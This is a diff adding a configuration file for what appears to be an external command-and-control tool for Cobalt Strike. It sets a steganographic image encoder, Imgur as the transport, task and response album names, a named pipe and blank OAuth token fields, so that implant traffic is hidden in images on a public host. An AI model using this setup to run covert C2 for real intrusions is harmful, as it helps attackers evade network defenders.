@@ -1,0 +1,25 @@
+[builder]
+encoder = "encoder_lsbjpg"
+transport = "transport_imgur"
+
+[framework]
+framework = 'cobalt_strike'
+
+[client_options]
+client.c2_block_time = '100'
+client.cdll_name = r'"cdll.dll"'
+client.c2_pipe_name = r'"\\\\.\\pipe\\foobar"'
+
+[encoder_options]
+img_format = r'"PNG"'
+img_size = '4320'
+
+[transport_options]
+USERNAME = r'""'
+client_id = r'""'
+client_secret = r'""'
+SEND_ALBUM_NAME = r'"TSK4U"'
+RECV_ALBUM_NAME = r'"RESP4U"'
+access_token = r'""'
+refresh_token = r'""'
+
